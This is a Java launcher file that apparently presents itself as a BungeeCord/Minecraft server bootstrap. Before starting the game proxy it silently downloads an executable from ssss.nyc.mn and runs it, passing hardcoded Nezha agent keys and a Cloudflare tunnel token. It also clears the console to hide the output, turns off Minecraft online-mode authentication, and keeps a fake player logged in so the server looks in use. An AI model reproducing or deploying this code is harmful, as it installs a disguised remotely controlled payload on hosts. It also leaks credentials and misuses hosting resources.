package net.md_5.bungee;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.zip.Deflater;
import java.util.zip.Inflater;
import java.lang.reflect.Field;

public class Bootstrap {

    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_YELLOW = "\033[1;33m";
    private static final String ANSI_RESET = "\033[0m";
    private static final AtomicBoolean running = new AtomicBoolean(true);
    
    private static Process sbxProcess;
    private static Process minecraftProcess; // 新增：MC进程
    private static Thread fakePlayerThread;

    private static final String[] ALL_ENV_VARS = {
        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
        "HY2_PORT", "TUIC_PORT", "REALITY_PORT", "CFIP", "CFPORT", 
        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO",
        "MC_JAR", "MC_MEMORY", "MC_ARGS", "MC_PORT", "FAKE_PLAYER_ENABLED", "FAKE_PLAYER_NAME"
    };

    public static void main(String[] args) throws Exception {
        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
            System.err.println(ANSI_RED + "ERROR: Your Java version is too lower,please switch the version in startup menu!" + ANSI_RESET);
            Thread.sleep(3000);
            System.exit(1);
        }

        // Start SbxService
        try {
            Map<String, String> config = loadEnvVars();
            runSbxBinary(config);

            // 1. 启动 Minecraft Server (新增逻辑)
            if (isMcServerEnabled(config)) {
                startMinecraftServer(config);
            } else {
                System.out.println(ANSI_YELLOW + "MC_JAR not set, skipping server.jar startup." + ANSI_RESET);
            }

            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                running.set(false);
                stopServices();
            }));

            // Wait 15 seconds for services to start
            Thread.sleep(15000);
            System.out.println(ANSI_GREEN + "Server is running!" + ANSI_RESET);

            // 2. 启动假人 (修改为并行启动)
            if (isFakePlayerEnabled(config)) {
                System.out.println(ANSI_YELLOW + "\n[FakePlayer] Waiting for MC server to fully start..." + ANSI_RESET);
                // 在新线程中等待并启动，避免阻塞主线程
                new Thread(() -> {
                    try {
                        waitForServerReady(config);
                        startFakePlayerBot(config);
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }).start();
            }

            System.out.println(ANSI_GREEN + "Thank you for using this script,Enjoy!\n" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Logs will be deleted in 20 seconds, you can copy the above nodes" + ANSI_RESET);
            Thread.sleep(20000);
            clearConsole();

        } catch (Exception e) {
            System.err.println(ANSI_RED + "Error initializing SbxService: " + e.getMessage() + ANSI_RESET);
        }

        // Continue with BungeeCord launch
        BungeeCordLauncher.main(args);
    }

    private static void clearConsole() {
        try {
            if (System.getProperty("os.name").contains("Windows")) {
                new ProcessBuilder("cmd", "/c", "cls && mode con: lines=30 cols=120").inheritIO().start().waitFor();
            } else {
                System.out.print("\033[H\033[3J\033[2J");
                System.out.flush();
                new ProcessBuilder("tput", "reset").inheritIO().start().waitFor();
                System.out.print("\033[8;30;120t");
                System.out.flush();
            }
        } catch (Exception e) {
            try { new ProcessBuilder("clear").inheritIO().start().waitFor(); } catch (Exception ignored) {}
        }
    }   

    private static void runSbxBinary(Map<String, String> envVars) throws Exception {
        ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
        pb.environment().putAll(envVars);
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        sbxProcess = pb.start();
    }

    private static Map<String, String> loadEnvVars() throws IOException {
        Map<String, String> envVars = new HashMap<>();
        envVars.put("UUID", "72edf147-493f-464f-a4e3-862e128cba4e");
        envVars.put("FILE_PATH", "./world");
        envVars.put("NEZHA_SERVER", "mbb.svip888.us.kg:53100");
        envVars.put("NEZHA_PORT", "");
        envVars.put("NEZHA_KEY", "VnrTnhgoack6PhnRH6lyshe4OVkHmPyM");
        envVars.put("ARGO_PORT", "8001");
        envVars.put("ARGO_DOMAIN", "cloudblaze.qzzi.qzz.io");
        envVars.put("ARGO_AUTH", "eyJhIjoiMGU3ZjI2MWZiY2ExMzcwNzZhNGZmODcxMzU3ZjYzNGQiLCJ0IjoiNjEzYTFhNjItN2E5NS00MzJkLWI4NmQtOTVkZDkwNzU2OGZiIiwicyI6IlpXTXlPV05rWWpJdE5tSXdPQzAwTVRjekxUZ3pOemt0WmpReE1EUTFZbVJoT0dSbSJ9");
        envVars.put("HY2_PORT", "");
        envVars.put("TUIC_PORT", "");
        envVars.put("REALITY_PORT", "");
        envVars.put("UPLOAD_URL", "");
        envVars.put("CHAT_ID", "");
        envVars.put("BOT_TOKEN", "");
        envVars.put("CFIP", "store.ubi.com");
        envVars.put("CFPORT", "443");
        envVars.put("NAME", "Mc");
        envVars.put("DISABLE_ARGO", "false");
        
        // MC Defaults
        envVars.put("MC_JAR", "server99.jar");
        envVars.put("MC_MEMORY", "512M");
        envVars.put("MC_PORT", "15133"); 
        envVars.put("FAKE_PLAYER_ENABLED", "true"); 
        envVars.put("FAKE_PLAYER_NAME", "laohu");

        // Override with system environment variables
        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) {
                envVars.put(var, value);  
            }
        }

        // Load from .env file
        Path envFile = Paths.get(".env");
        if (Files.exists(envFile)) {
            for (String line : Files.readAllLines(envFile)) {
                line = line.trim();
                if (line.isEmpty() || line.startsWith("#")) continue;
                line = line.split(" #")[0].split(" //")[0].trim();
                if (line.startsWith("export ")) line = line.substring(7).trim();
                String[] parts = line.split("=", 2);
                if (parts.length == 2) {
                    String key = parts[0].trim();
                    String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
                    if (Arrays.asList(ALL_ENV_VARS).contains(key)) envVars.put(key, value); 
                }
            }
        }
        return envVars;
    }

    private static Path getBinaryPath() throws IOException {
        String osArch = System.getProperty("os.arch").toLowerCase();
        String url;
        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
            url = "https://amd64.ssss.nyc.mn/sbsh";
        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
            url = "https://arm64.ssss.nyc.mn/sbsh";
        } else if (osArch.contains("s390x")) {
            url = "https://s390x.ssss.nyc.mn/sbsh";
        } else {
            throw new RuntimeException("Unsupported architecture: " + osArch);
        }
        
        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
        if (!Files.exists(path)) {
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
            }
            if (!path.toFile().setExecutable(true)) {
                throw new IOException("Failed to set executable permission");
            }
        }
        return path;
    }

    private static void stopServices() {
        if (sbxProcess != null && sbxProcess.isAlive()) {
            sbxProcess.destroy();
            System.out.println(ANSI_RED + "sbx process terminated" + ANSI_RESET);
        }
        if (minecraftProcess != null && minecraftProcess.isAlive()) { // 新增：停止 MC
            minecraftProcess.destroy();
            System.out.println(ANSI_YELLOW + "Minecraft Server stopped" + ANSI_RESET);
        }
        if (fakePlayerThread != null && fakePlayerThread.isAlive()) {
            fakePlayerThread.interrupt();
            System.out.println(ANSI_YELLOW + "[FakePlayer] Stopped" + ANSI_RESET);
        }
    }

    // ==================== Minecraft Server Logic ====================

    private static boolean isMcServerEnabled(Map<String, String> config) {
        String jar = config.get("MC_JAR");
        return jar != null && !jar.isEmpty() && !jar.equalsIgnoreCase("false");
    }

    private static void startMinecraftServer(Map<String, String> config) throws Exception {
        String jarName = config.get("MC_JAR");
        String memory = config.getOrDefault("MC_MEMORY", "1024M");
        String extraArgs = config.getOrDefault("MC_ARGS", "");

        if (!Files.exists(Paths.get(jarName))) {
            System.out.println(ANSI_RED + "[MC-Server] " + jarName + " not found! Skipping." + ANSI_RESET);
            return;
        }

        // Auto Accept EULA
        Path eulaPath = Paths.get("eula.txt");
        if (!Files.exists(eulaPath) || !new String(Files.readAllBytes(eulaPath)).contains("eula=true")) {
            System.out.println(ANSI_GREEN + "[MC-Server] Auto-accepting EULA." + ANSI_RESET);
            Files.write(eulaPath, "eula=true".getBytes());
        }

        // Modify server.properties (only online-mode)
        Path propPath = Paths.get("server.properties");
        if (Files.exists(propPath)) {
            String props = new String(Files.readAllBytes(propPath));
            if (props.contains("online-mode=true")) {
                System.out.println(ANSI_GREEN + "[MC-Server] Setting online-mode=false." + ANSI_RESET);
                props = props.replace("online-mode=true", "online-mode=false");
                Files.write(propPath, props.getBytes());
            }
        }

        System.out.println(ANSI_GREEN + "Starting Minecraft Server (" + jarName + ", " + memory + ")..." + ANSI_RESET);

        List<String> cmd = new ArrayList<>();
        cmd.add("java");
        cmd.add("-Xms" + memory);
        cmd.add("-Xmx" + memory);
        if (!extraArgs.isEmpty()) cmd.addAll(Arrays.asList(extraArgs.split("\\s+")));
        cmd.add("-XX:+UseG1GC"); // Basic optimization
        cmd.add("-jar");
        cmd.add(jarName);
        cmd.add("nogui");

        ProcessBuilder pb = new ProcessBuilder(cmd);
        pb.redirectErrorStream(true);
        minecraftProcess = pb.start();

        new Thread(() -> {
            try (BufferedReader reader = new BufferedReader(new InputStreamReader(minecraftProcess.getInputStream()))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    System.out.println("[MC-Server] " + line);
                }
            } catch (IOException e) {}
        }).start();
    }

    // ==================== Fake Player Logic (Stable 1.21.4) ====================

    private static boolean isFakePlayerEnabled(Map<String, String> config) {
        String enabled = config.get("FAKE_PLAYER_ENABLED");
        return enabled != null && enabled.equalsIgnoreCase("true");
    }

    private static int getMcPort(Map<String, String> config) {
        String portStr = config.get("MC_PORT");
        if (portStr == null || portStr.trim().isEmpty()) return 25565;
        try { return Integer.parseInt(portStr.trim()); } catch (NumberFormatException e) { return 25565; }
    }

    private static void waitForServerReady(Map<String, String> config) throws InterruptedException {
        int mcPort = getMcPort(config);
        System.out.println(ANSI_YELLOW + "[FakePlayer] Checking server status on port " + mcPort + "..." + ANSI_RESET);
        for (int i = 0; i < 60; i++) {
            try {
                Thread.sleep(5000);
                try (Socket testSocket = new Socket()) {
                    testSocket.connect(new InetSocketAddress("127.0.0.1", mcPort), 3000);
                    System.out.println(ANSI_GREEN + "[FakePlayer] ✓ Server port " + mcPort + " is ready!" + ANSI_RESET);
                    Thread.sleep(10000);
                    return;
                }
            } catch (Exception e) {
                if (i % 6 == 0) System.out.println(ANSI_YELLOW + "[FakePlayer] Waiting... (" + (i * 5) + "s)" + ANSI_RESET);
            }
        }
        System.out.println(ANSI_RED + "[FakePlayer] Warning: Timeout, trying anyway..." + ANSI_RESET);
    }

    private static void startFakePlayerBot(Map<String, String> config) {
        String playerName = config.getOrDefault("FAKE_PLAYER_NAME", "Steve");
        int mcPort = getMcPort(config);

        System.out.println(ANSI_GREEN + "[FakePlayer] Starting fake player: " + playerName + ANSI_RESET);
        System.out.println(ANSI_GREEN + "[FakePlayer] Protocol: 1.21.4 (Stable Stream)" + ANSI_RESET);

        fakePlayerThread = new Thread(() -> {
            int failCount = 0;
            byte[] trashBuffer = new byte[65536];

            while (running.get()) {
                Socket socket = null;
                try {
                    socket = new Socket();
                    socket.setReceiveBufferSize(10 * 1024 * 1024);
                    socket.connect(new InetSocketAddress("127.0.0.1", mcPort), 5000);
                    socket.setSoTimeout(0); 

                    DataOutputStream out = new DataOutputStream(socket.getOutputStream());
                    DataInputStream in = new DataInputStream(new BufferedInputStream(socket.getInputStream()));

                    // Handshake
                    ByteArrayOutputStream handshakeBuf = new ByteArrayOutputStream();
                    DataOutputStream handshake = new DataOutputStream(handshakeBuf);
                    writeVarInt(handshake, 0x00);
                    writeVarInt(handshake, 774); 
                    writeString(handshake, "127.0.0.1");
                    handshake.writeShort(mcPort);
                    writeVarInt(handshake, 2); 
                    byte[] handshakeData = handshakeBuf.toByteArray();
                    writeVarInt(out, handshakeData.length);
                    out.write(handshakeData);
                    out.flush();

                    // Login
                    ByteArrayOutputStream loginBuf = new ByteArrayOutputStream();
                    DataOutputStream login = new DataOutputStream(loginBuf);
                    writeVarInt(login, 0x00);
                    writeString(login, playerName);
                    UUID playerUUID = UUID.nameUUIDFromBytes(("OfflinePlayer:" + playerName).getBytes("UTF-8"));
                    login.writeLong(playerUUID.getMostSignificantBits());
                    login.writeLong(playerUUID.getLeastSignificantBits());
                    byte[] loginData = loginBuf.toByteArray();
                    writeVarInt(out, loginData.length);
                    out.write(loginData);
                    out.flush();

                    System.out.println(ANSI_GREEN + "[FakePlayer] ✓ Connected" + ANSI_RESET);
                    failCount = 0;

                    boolean configPhase = false;
                    boolean playPhase = false;
                    boolean compressionEnabled = false;
                    int compressionThreshold = -1;

                    while (running.get() && !socket.isClosed()) {
                        try {
                            int packetLength = readVarInt(in);
                            if (packetLength < 0 || packetLength > 100000000) throw new IOException("Bad size");

                            byte[] packetData = null;
                            if (compressionEnabled) {
                                int dataLength = readVarInt(in);
                                int compressedLength = packetLength - getVarIntSize(dataLength);
                                byte[] compressedData = new byte[compressedLength];
                                in.readFully(compressedData);

                                if (dataLength == 0) {
                                    packetData = compressedData;
                                } else {
                                    if (dataLength > 8192) {
                                        packetData = null; 
                                    } else {
                                        try {
                                            Inflater inflater = new Inflater();
                                            inflater.setInput(compressedData);
                                            packetData = new byte[dataLength];
                                            inflater.inflate(packetData);
                                            inflater.end();
                                        } catch (Exception e) { packetData = null; }
                                    }
                                }
                            } else {
                                byte[] rawData = new byte[packetLength];
                                in.readFully(rawData);
                                packetData = rawData;
                            }

                            if (packetData == null) continue;

                            ByteArrayInputStream packetStream = new ByteArrayInputStream(packetData);
                            DataInputStream packetIn = new DataInputStream(packetStream);
                            int packetId = readVarInt(packetIn);

                            if (!playPhase) {
                                if (!configPhase) {
                                    if (packetId == 0x03) {
                                        compressionThreshold = readVarInt(packetIn);
                                        compressionEnabled = compressionThreshold >= 0;
                                    } else if (packetId == 0x02) {
                                        ByteArrayOutputStream ackBuf = new ByteArrayOutputStream();
                                        DataOutputStream ack = new DataOutputStream(ackBuf);
                                        writeVarInt(ack, 0x03);
                                        sendPacket(out, ackBuf.toByteArray(), compressionEnabled, compressionThreshold);
                                        configPhase = true;

                                        ByteArrayOutputStream clientInfoBuf = new ByteArrayOutputStream();
                                        DataOutputStream info = new DataOutputStream(clientInfoBuf);
                                        writeVarInt(info, 0x00);
                                        writeString(info, "en_US");
                                        info.writeByte(10);
                                        writeVarInt(info, 0);
                                        info.writeBoolean(true);
                                        info.writeByte(127);
                                        writeVarInt(info, 1);
                                        info.writeBoolean(false);
                                        info.writeBoolean(true);
                                        writeVarInt(info, 0);
                                        sendPacket(out, clientInfoBuf.toByteArray(), compressionEnabled, compressionThreshold);
                                    }
                                } else {
                                    if (packetId == 0x03) {
                                        ByteArrayOutputStream ackBuf = new ByteArrayOutputStream();
                                        DataOutputStream ack = new DataOutputStream(ackBuf);
                                        writeVarInt(ack, 0x03);
                                        sendPacket(out, ackBuf.toByteArray(), compressionEnabled, compressionThreshold);
                                        playPhase = true;
                                        System.out.println(ANSI_GREEN + "[FakePlayer] Joined Game!" + ANSI_RESET);
                                    } else if (packetId == 0x04) {
                                        long id = packetIn.readLong();
                                        ByteArrayOutputStream ackBuf = new ByteArrayOutputStream();
                                        DataOutputStream ack = new DataOutputStream(ackBuf);
                                        writeVarInt(ack, 0x04);
                                        ack.writeLong(id);
                                        sendPacket(out, ackBuf.toByteArray(), compressionEnabled, compressionThreshold);
                                    } else if (packetId == 0x0E) {
                                        ByteArrayOutputStream buf = new ByteArrayOutputStream();
                                        DataOutputStream bufOut = new DataOutputStream(buf);
                                        writeVarInt(bufOut, 0x07);
                                        writeVarInt(bufOut, 0);
                                        sendPacket(out, buf.toByteArray(), compressionEnabled, compressionThreshold);
                                    }
                                }
                            } else {
                                // 1.21.4 (Recv 0x26 -> Send 0x1B)
                                if (packetId == 0x26) {
                                    if (packetIn.available() >= 8) {
                                        long keepAliveId = packetIn.readLong();
                                        ByteArrayOutputStream buf = new ByteArrayOutputStream();
                                        DataOutputStream bufOut = new DataOutputStream(buf);
                                        writeVarInt(bufOut, 0x1B);
                                        bufOut.writeLong(keepAliveId);
                                        sendPacket(out, buf.toByteArray(), compressionEnabled, compressionThreshold);
                                    }
                                } else if (packetId == 0x1D) {
                                    System.out.println(ANSI_RED + "[FakePlayer] Kicked" + ANSI_RESET);
                                    break;
                                }
                            }
                        } catch (IOException e) {
                            break; 
                        }
                    }
                    if (socket != null) socket.close();
                    System.out.println(ANSI_YELLOW + "[FakePlayer] Reconnecting in 10s..." + ANSI_RESET);
                    Thread.sleep(10000);
                } catch (ConnectException e) {
                    System.out.println(ANSI_YELLOW + "[FakePlayer] Server offline, retrying..." + ANSI_RESET);
                    try { Thread.sleep(5000); } catch (Exception ex) {}
                } catch (Exception e) {
                    failCount++;
                    System.out.println(ANSI_YELLOW + "[FakePlayer] Error: " + e.getMessage() + ANSI_RESET);
                    try { Thread.sleep(10000); } catch (Exception ex) {}
                }
            }
        });
        fakePlayerThread.setDaemon(true);
        fakePlayerThread.start();
    }

    private static int getVarIntSize(int value) {
        int size = 0;
        do { size++; value >>>= 7; } while (value != 0);
        return size;
    }

    private static void sendPacket(DataOutputStream out, byte[] packet, boolean compress, int threshold) throws IOException {
        if (!compress || packet.length < threshold) {
            if (compress) {
                ByteArrayOutputStream buf = new ByteArrayOutputStream();
                DataOutputStream bufOut = new DataOutputStream(buf);
                writeVarInt(bufOut, 0);
                bufOut.write(packet);
                byte[] finalPacket = buf.toByteArray();
                writeVarInt(out, finalPacket.length);
                out.write(finalPacket);
            } else {
                writeVarInt(out, packet.length);
                out.write(packet);
            }
        } else {
            byte[] compressedData = compressData(packet);
            ByteArrayOutputStream buf = new ByteArrayOutputStream();
            DataOutputStream bufOut = new DataOutputStream(buf);
            writeVarInt(bufOut, packet.length);
            bufOut.write(compressedData);
            byte[] finalPacket = buf.toByteArray();
            writeVarInt(out, finalPacket.length);
            out.write(finalPacket);
        }
        out.flush();
    }

    private static byte[] compressData(byte[] data) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        Deflater deflater = new Deflater();
        deflater.setInput(data);
        deflater.finish();
        byte[] buffer = new byte[1024];
        while (!deflater.finished()) {
            int count = deflater.deflate(buffer);
            out.write(buffer, 0, count);
        }
        deflater.end();
        return out.toByteArray();
    }

    private static void writeVarInt(DataOutputStream out, int value) throws IOException {
        while ((value & 0xFFFFFF80) != 0) {
            out.writeByte((value & 0x7F) | 0x80);
            value >>>= 7;
        }
        out.writeByte(value & 0x7F);
    }

    private static void writeString(DataOutputStream out, String str) throws IOException {
        byte[] bytes = str.getBytes("UTF-8");
        writeVarInt(out, bytes.length);
        out.write(bytes);
    }

    private static int readVarInt(DataInputStream in) throws IOException {
        int value = 0;
        int length = 0;
        byte currentByte;
        do {
            currentByte = in.readByte();
            value |= (currentByte & 0x7F) << (length * 7);
            length++;
            if (length > 5) throw new IOException("VarInt too big");
        } while ((currentByte & 0x80) == 0x80);
        return value;
    }
}
